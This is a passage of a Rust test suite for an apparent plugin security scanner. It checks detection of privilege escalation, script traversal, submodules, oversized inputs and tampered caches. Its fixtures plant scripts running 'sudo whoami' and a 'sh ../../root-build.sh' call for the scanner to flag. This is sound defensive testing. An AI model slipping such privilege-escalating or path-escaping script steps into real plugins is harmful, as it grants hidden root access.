            .iter()
            .find(|f| f.rule == "privilege-escalation")
            .unwrap();
        let after = delta
            .findings
            .iter()
            .find(|f| f.rule == "privilege-escalation")
            .unwrap();
        assert_eq!(before.id, after.id);
        assert_ne!(before.line, after.line);
        assert!(!after.is_new);
        assert!(
            fresh
                .findings
                .iter()
                .find(|f| f.rule == "privilege-escalation")
                .unwrap()
                .is_new
        );
        let same = repo.inspect(&new, None, Some(&new));
        assert!(same.unapproved_rules(&[]).is_empty());
        assert!(delta
            .unapproved_rules(&[])
            .contains(&"script-change".into()));
    }

    #[test]
    fn selected_plugin_excludes_siblings_and_inactive_platform_scripts() {
        let repo = Repo::new();
        let inactive = if util::current_platform() == "windows" {
            "linux"
        } else {
            "windows"
        };
        let text = format!(
            "{}\n[[build]]\nplatforms = ['{inactive}']\ncommand = ['sh', 'other.script']\n",
            manifest("build.sh")
        );
        repo.put("plugins/a/herdr-plugin.toml", text);
        repo.put("plugins/a/build.sh", "echo hello\n");
        repo.put("plugins/a/other.script", "sudo whoami\n");
        repo.put("plugins/b/herdr-plugin.toml", manifest("build.sh"));
        repo.put("plugins/b/build.sh", "sudo whoami\n");
        repo.put("root-build.sh", "sudo whoami\n");
        let sha = repo.commit();
        let report = repo.inspect(&sha, Some("plugins/a"), None);
        assert!(!rules(&report).contains(&"privilege-escalation"));
        repo.put("plugins/a/build.sh", "sh ../../root-build.sh\n");
        let sha = repo.commit();
        let report = repo.inspect(&sha, Some("plugins/a"), None);
        assert!(report.findings.iter().any(
            |f| f.rule == "privilege-escalation" && f.path.as_deref() == Some("root-build.sh")
        ));
    }

    #[test]
    fn oversized_selected_input_and_submodule_require_incomplete_approval() {
        let repo = Repo::new();
        repo.put(FILE_NAME, manifest("build.sh"));
        repo.put("build.sh", vec![b'x'; MAX_BLOB + 1]);
        let old = repo.commit();
        let report = repo.inspect(&old, None, None);
        assert!(!report.complete);
        assert!(report.unapproved_rules(&[]).contains(&"incomplete".into()));
        repo.put("build.sh", "echo hello\n");
        repo.git(&[
            "update-index",
            "--add",
            "--cacheinfo",
            &format!("160000,{old},vendor"),
        ]);
        let sha = repo.commit_staged();
        let report = repo.inspect(&sha, None, None);
        assert!(!report.complete);
        assert!(rules(&report).contains(&"submodule"));
    }

    #[test]
    fn malformed_or_mismatched_cache_rescans_instead_of_clean_success() {
        let repo = Repo::new();
        repo.put(FILE_NAME, manifest("build.sh"));
        repo.put("build.sh", "sudo whoami\n");
        let sha = repo.commit();
        let report = repo.inspect(&sha, None, None);
        assert!(rules(&report).contains(&"privilege-escalation"));
        let cache = std::fs::read_dir(&repo.cache)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        std::fs::write(&cache, b"{ broken").unwrap();
        assert!(rules(&repo.inspect(&sha, None, None)).contains(&"privilege-escalation"));
        let mut cached: Cache = serde_json::from_slice(&std::fs::read(&cache).unwrap()).unwrap();
        cached.scan.findings.clear();
        std::fs::write(cache, serde_json::to_vec(&cached).unwrap()).unwrap();
        assert!(rules(&repo.inspect(&sha, None, None)).contains(&"privilege-escalation"));
    }

    #[test]
    fn missing_script_and_binary_are_incomplete_but_generated_executable_is_not() {
        let repo = Repo::new();
        repo.put(FILE_NAME, manifest("missing.sh"));
        let sha = repo.commit();
        assert!(!repo.inspect(&sha, None, None).complete);
        repo.put(FILE_NAME, manifest("build.sh"));
        repo.put("build.sh", "echo hello\n");
        repo.put("tool", b"\x7fELF\0binary");
        repo.put(
            FILE_NAME,
            format!(
                "{}\n[[startup]]\ncommand = ['./tool']\n",
                manifest("build.sh")
            ),
        );
        let sha = repo.commit();
        assert!(!repo.inspect(&sha, None, None).complete);
        repo.put(
            FILE_NAME,
            format!(
                "{}\n[[startup]]\ncommand = ['./target/release/generated']\n",
                manifest("build.sh")
            ),
        );
        let sha = repo.commit();
        assert!(repo.inspect(&sha, None, None).complete);
    }
}
